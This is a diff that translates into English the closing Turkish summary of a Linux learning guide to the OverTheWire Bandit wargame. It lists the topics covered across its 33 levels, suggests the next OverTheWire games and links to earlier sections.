-33 level boyunca öğrendiklerin:
+What you learned across 33 levels:
 
-**Bölüm 1 (0-10):** SSH, dosya sistemi gezinme, metin işleme temelleri  
-**Bölüm 2 (11-20):** Encoding, sıkıştırma, ağ iletişimi, SSH ileri özellikleri, dosya izinleri  
-**Bölüm 3 (21-33):** Cron, bash scripting, brute force, kısıtlı ortamdan kaçış, Git
+**Section 1 (0-10):** SSH, filesystem navigation, text processing basics  
+**Section 2 (11-20):** Encoding, compression, network communication, advanced SSH features, file permissions  
+**Section 3 (21-33):** Cron, bash scripting, brute force, escaping restricted environments, Git
 
-**Sıradaki OverTheWire oyunları:**
-- **Leviathan** → basit tersine mühendislik
-- **Natas** → web güvenliği temelleri
-- **Krypton** → kriptografi
+**Next OverTheWire games:**
+- **Leviathan** → basic reverse engineering
+- **Natas** → web security basics
+- **Krypton** → cryptography
 
 ---
 
-**Önceki bölümler:** [bandit_0-10.md](./bandit_0-10.md) · [bandit_11-20.md](./bandit_11-20.md)
+**Previous sections:** [bandit_0-10.md](./bandit_0-10.md) · [bandit_11-20.md](./bandit_11-20.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
